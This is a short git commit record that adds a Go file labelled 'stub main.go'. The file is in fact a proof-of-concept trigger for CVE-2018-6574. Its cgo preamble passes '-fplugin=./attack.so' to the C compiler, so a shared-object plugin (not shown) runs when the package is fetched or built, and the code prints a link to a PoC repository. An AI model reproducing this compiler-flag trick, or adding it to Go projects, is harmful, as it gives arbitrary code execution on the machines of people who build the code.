45099b75bde4fcae43d7d40cbb1df1bdf3e32f68
root <root@localhost.localdomain>
2019-11-29 08:27:10 -0600

    stub main.go

---
+++ main.go
@@ -0,0 +1,15 @@
+package main
+
+/*
+#cgo CFLAGS: -fplugin=./attack.so
+
+void echo() {
+  printf("link: https://github.com/neargle/CVE-2018-6574-POC");
+}
+*/
+import "C"
+
+func main() {
+	C.echo()
+	return
+}
